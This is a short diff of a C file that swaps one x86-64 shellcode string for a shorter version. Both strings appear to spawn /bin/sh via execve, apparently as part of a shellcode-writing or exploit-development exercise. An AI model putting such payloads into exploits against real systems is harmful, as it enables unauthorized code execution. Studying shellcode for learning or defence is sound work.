@@ -1,4 +1,4 @@
-char shellcode[] = "1\300PH\272/bin//shRT_PTZH\215O\6QT^\260;\17\5";
+char shellcode[] = "1\322RH\276/bin//shVT_R^\260;\17\5";
 
 #include <sys/mman.h>
 #include <string.h>
